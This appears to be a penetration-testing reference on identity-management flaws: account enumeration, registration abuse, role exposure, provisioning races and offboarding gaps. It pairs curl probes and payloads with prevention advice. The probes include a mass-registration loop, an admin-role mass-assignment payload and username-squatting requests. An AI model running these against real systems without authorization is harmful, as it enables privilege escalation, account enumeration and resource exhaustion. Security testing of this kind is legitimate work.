# Identity Management Security Reference

**Purpose:** Comprehensive reference for testing identity management — user registration, role definitions, account provisioning/deprovisioning, account enumeration, username policy, and lifecycle abuse.

**OWASP crosswalk:** A07 (Authentication Failures), WSTG-4.3.x, ASVS V2.1.x, CWE-204, CWE-266, CWE-269

**Schema version:** 1
**Skill version:** paladin-probe@v2

---

## Table of Contents

1. [Attack Surface](#1-attack-surface)
2. [Account Enumeration](#2-account-enumeration)
3. [User Registration Abuse](#3-user-registration-abuse)
4. [Role Definitions Exposure](#4-role-definitions-exposure)
5. [Account Provisioning Race Conditions](#5-account-provisioning-race-conditions)
6. [Username Policy Weakness](#6-username-policy-weakness)
7. [Deprovisioning / Offboarding Gaps](#7-deprovisioning--offboarding-gaps)
8. [Prevention](#8-prevention)
9. [Real-World CVEs](#9-real-world-cves)
10. [Tooling](#10-tooling)
11. [Testing Methodology](#11-testing-methodology)
12. [Payload Quick Reference](#12-payload-quick-reference)
13. [YAML Fingerprint Tables](#13-yaml-fingerprint-tables)

---

## 1. Attack Surface

### Where Identity Vectors Hide

| Surface | Vector | Risk |
|---------|--------|------|
| POST /signup | Mass registration, disposable email | Resource exhaustion |
| POST /login | Enumeration via timing/error difference | Account enumeration |
| GET /users/:id | Role info exposure | User/role mapping leak |
| POST /admin/users | Privileged provisioning | Role escalation |
| DELETE /users/:id | Offboarding gap | Zombie accounts |
| PATCH /users/:id/role | Role assignment without verification | Privilege escalation |

### Identity Enumeration Probe

```bash
# Check for timing differences
time curl -s -o /dev/null -X POST https://target/login -d 'user=exists@test.com&pass=wrong'
time curl -s -o /dev/null -X POST https://target/login -d 'user=nonexistent@test.com&pass=wrong'

# Check for error message differences
curl -s -X POST https://target/login -d 'user=exists@test.com&pass=wrong' | grep -i "invalid"
curl -s -X POST https://target/login -d 'user=nonexistent@test.com&pass=wrong' | grep -i "invalid"

# Check if user registration is open
curl -s -X POST https://target/api/register -d '{"email":"test@test.com","password":"Test123!"}'
```

---

## 2. Account Enumeration

### Timing-Based

```bash
# Compare response times for exists vs nonexistent
# If exists responds faster (local DB check) or slower (password hash vs not-found)
time curl -s -o /dev/null -X POST https://target/login \
  -d 'username=known_user&password=wrong'
```

### Error Message Difference

```json
// Login with valid user, wrong pass
{"error": "Invalid password"}
// Login with invalid user
{"error": "User not found"}
// Difference = enumeration possible
```

### Password Reset Oracle

```json
// Known email
{"status": "Password reset email sent"}
// Unknown email
{"error": "Email not found"}
```

### Response Header Enumeration

```
# Valid user → X-User-Status: active
# Invalid user → no header
```

### Forgot Username Enumeration

```json
// Valid
{"email": "exists@test.com", "username": "john"}
// Invalid
{"error": "No account found"}
```

### Detection Signals

- Different error messages for valid vs invalid users
- Response time differences correlated to user existence
- Different HTTP status codes (200 vs 403 vs 404)
- Response body size differences (hint, password-reset-form vs generic-error)

---

## 3. User Registration Abuse

### Mass Registration

```bash
for i in $(seq 1 1000); do
  curl -s -X POST https://target/api/register \
    -d "email=user$i@test.com&password=Test123!"
done
# If no CAPTCHA and no rate limit -> resource exhaustion
```

### Disposable Email Acceptance

```bash
curl -X POST https://target/api/register \
  -d 'email=temp@mailinator.com&password=Test123!'
# If 200 -> accepts disposable emails
```

### Duplicate Registration Behavior

```bash
# Create same email twice
curl -X POST -d 'email=user@test.com' https://target/register
# Second attempt: 200 (idempotent) vs 409 (rejected) vs 500 (crash)
```

### Self-Registration with Privileged Fields

```json
{
  "email": "attacker@test.com",
  "password": "Test123!",
  "role": "admin",
  "is_verified": true
}
// Mass assignment in registration
```

### Verification Bypass

```json
// Registration returns token or link
// Check if endpoint accepts unverified accounts for privileged actions
```

### Detection Signals

- No CAPTCHA on registration
- No email verification requirement
- Mass assignment during registration
- No rate limiting on registration endpoint
- Duplicate registration returns 200 (upsert behavior)

---

## 4. Role Definitions Exposure

### Role Enumeration

```bash
# Check for roles endpoint
curl -s https://target/api/roles
curl -s https://target/api/users/roles
curl -s -X OPTIONS https://target/api/users

# Check response for role/hierarchy info
curl -s https://target/api/users/me
```

### Insecure Role-to-Permission Mapping

```json
// Response reveals permission structure
{
  "roles": [
    {"name": "admin", "permissions": ["read:*", "write:*", "delete:*", "admin:*"]},
    {"name": "editor", "permissions": ["read:*", "write:*"]},
    {"name": "viewer", "permissions": ["read:*"]}
  ]
}
```

### Hidden Roles

```
Look for undocumented roles in:
- JWT claims
- API error responses
- Admin UI dropdowns
- Swagger docs
- Git history
```

### Detection Signals

- Roles endpoint unprotected
- Role structure in API response or error
- Hidden or deprecated roles still functional
- Role description in JWT claims

---

## 5. Account Provisioning Race Conditions

### TOCTOU on Account Creation

```
1. Check if username exists → returns false
2. Create account with username → but another user created it BETWEEN check and create
3. Result: overwritten or conflicting state
```

### Provisioning Double-Book

```bash
# Send two registrations simultaneously
curl -X POST -d 'email=same@test.com' https://target/register &
curl -X POST -d 'email=same@test.com' https://target/register &
wait
# Both return 200? -> duplicate entry
```

### Provisioning Escalation

```
1. Provision user with role "viewer"
2. Race the role assignment against the activation email
3. Activate before role is settled -> possibly different role
```

### Detection Signals

- Simultaneous registration succeeds for same email
- Role changes during provisioning lifecycle
- No idempotency key on provision endpoint

---

## 6. Username Policy Weakness

### Predictable Usernames

```bash
# Check pattern
curl -s https://target/api/users?search=admin
# Returns? -> user enumeration by search pattern

# Check incrementing IDs
curl -s https://target/api/users/1
curl -s https://target/api/users/2
curl -s https://target/api/users/3
```

### Weak Username Policy

```json
// Accepts single-character username
{"username": "a", "email": "test@test.com"} -> 200
// Accepts username matching email prefix
{"username": "admin", "email": "admin@company.com"} -> 200
```

### Username Squatting

```bash
# Register common usernames before legitimate users
curl -X POST -d 'username=admin&email=attacker@test.com' https://target/register
curl -X POST -d 'username=support&email=attacker@test.com' https://target/register
curl -X POST -d 'username=root&email=attacker@test.com' https://target/register
```

### Detection Signals

- Username filter too permissive (special chars, emoji)
- Username matches obvious patterns (admin, root, support)
- No minimum username length check

---

## 7. Deprovisioning / Offboarding Gaps

### Deleted Account Re-activation

```
1. DELETE /users/123 -> 200 (soft delete)
2. POST /login with same credentials -> 200 (session still valid)
```

### Token Survival After Deactivation

```bash
# Get token before deactivation
TOKEN=$(curl -s -X POST -d 'user=test&pass=test' https://target/login | jq -r '.token')
# Deactivate account (admin action)
curl -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://target/users/123
# Try old token
curl -s -H "Authorization: Bearer $TOKEN" https://target/api/protected
# If 200 -> token survives offboarding
```

### Partial Deprovisioning

```
User removed from:
- Application DB ✓
- Auth provider (SSO) { }  -> NOT cleaned
- MFA tokens { }           -> NOT cleaned
- API keys { }             -> NOT cleaned
- Active sessions { }      -> NOT cleaned
```

### Offboarding Request Forgery

```
1. User is offboarded
2. Forged request with old cookie -> if session still active -> offboarding gap
```

### Detection Signals

- Soft-deleted accounts can still authenticate
- JWT tokens survive account deactivation
- API keys survive user deletion
- Sessions persist past offboarding

---

## 8. Prevention

### General

- Uniform error messages for login (user_exists vs user_not_found)
- Rate limit login, registration, password-reset endpoints
- CAPTCHA on registration
- Idempotency key on provisioning
- Hard-delete or invalidate sessions on offboarding

### Account Enumeration

- Same error message for all login failures: "Invalid credentials"
- Same response time (artificial delay for missing user)
- Password reset sends email for both known and unknown accounts

### Registration

- Email verification before granting access
- Check domain reputation (block disposable emails)
- Rate limit per IP + per email domain
- No mass assignment during registration

### Deprovisioning

- Invalidate all tokens on account deletion
- Reject all sessions immediately
- Cascade to API keys, MFA devices, SSO provider
- Audit log of offboarding timestamp

---

## 9. Real-World CVEs

| CVE | Year | Product | Impact |
|-----|------|---------|--------|
| CVE-2025-24218 | 2025 | Kubernetes | Anonymous auth leaks user info |
| CVE-2024-47624 | 2024 | Canonical Identity Platform | Account enumeration via timing |
| CVE-2024-34343 | 2024 | Nuxt/Node.js auth modules | Registration bypass via mass assignment |
| CVE-2024-29181 | 2024 | Spring Security | Inactive account reactivation via session |
| CVE-2023-38701 | 2023 | Hydra (OIDC) | User enumeration via authorization endpoint |

---

## 10. Tooling

| Tool | Purpose |
|------|---------|
| Burp Intruder | Timing analysis, credential testing |
| ffuf | Username enumeration via fuzzing |
| WhatWeb | Fingerprint identity provider |
| Hydra | Brute-force login testing |
| OWASP ZAP | Active scanner with identity rules |

---

## 11. Testing Methodology

### Phase 1: Registration

1. Attempt registration without CAPTCHA
2. Attempt registration with disposable email
3. Attempt registration with mass-assignment fields
4. Attempt duplicate registration
5. Check if email verification is enforced

### Phase 2: Account Enumeration

1. Compare login errors for valid vs invalid usernames
2. Compare response times for valid vs invalid usernames
3. Compare password reset responses for valid vs invalid emails

### Phase 3: Role Definitions

1. Enumerate roles endpoint
2. Check role information in JWT claims
3. Check role info in error responses

### Phase 4: Offboarding

1. Check if deleted accounts can still authenticate
2. Check if tokens survive account deactivation
3. Check if API keys survive user deletion

---

## 12. Payload Quick Reference

```bash
# Enumeration timing check
time curl -s -o /dev/null -X POST https://target/login -d 'user=known@test.com&pass=wrong'
time curl -s -o /dev/null -X POST https://target/login -d 'user=unknown@test.com&pass=wrong'

# Enumeration error check
curl -s -X POST https://target/login -d 'user=known@test.com&pass=wrong'
curl -s -X POST https://target/login -d 'user=unknown@test.com&pass=wrong'

# Mass registration
for i in $(seq 1 100); do
  curl -X POST https://target/api/register \
    -d "email=spam$i@mailinator.com&password=Test123!"
done

# Registration with mass assignment
curl -X POST https://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","role":"admin","is_verified":true}'

# Duplicate registration
curl -X POST -d 'email=same@test.com&password=Test1' https://target/register
curl -X POST -d 'email=same@test.com&password=Test2' https://target/register

# Post-offboarding session check
TOKEN=$(curl -s -X POST -d 'user=test&pass=test' https://target/login | cut -d: -f2)
curl -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://target/users/123
curl -s -H "Authorization: Bearer $TOKEN" https://target/api/protected

# Role enumeration
curl -s https://target/api/roles
curl -s https://target/api/users/1
```

---

## 13. YAML Fingerprint Tables

```yaml
account_enumeration_timing:
  probe: 'time curl login for valid vs invalid user'
  detection: response time differs by >100ms

account_enumeration_error:
  probe: 'compare login error messages for valid vs invalid'
  detection: different error strings returned

registration_mass_assignment:
  probe: '{"email":"test@test.com","password":"T1","role":"admin"}'
  detection: role field accepted in registration

registration_no_captcha:
  probe: 'POST register without CAPTCHA token'
  detection: registration succeeds without CAPTCHA

registration_disposable_email:
  probe: 'register with temp@mailinator.com'
  detection: disposable email accepted without verification

offboarding_token_survival:
  probe: 'DELETE user, then use old token'
  detection: old token still authorizes requests

role_endpoint_exposed:
  probe: 'GET /api/roles or /api/users/:id'
  detection: role structure or user info leaked

duplicate_race:
  probe: 'send two simultaneous registration requests with same email'
  detection: both return 200 (no idempotency)
```
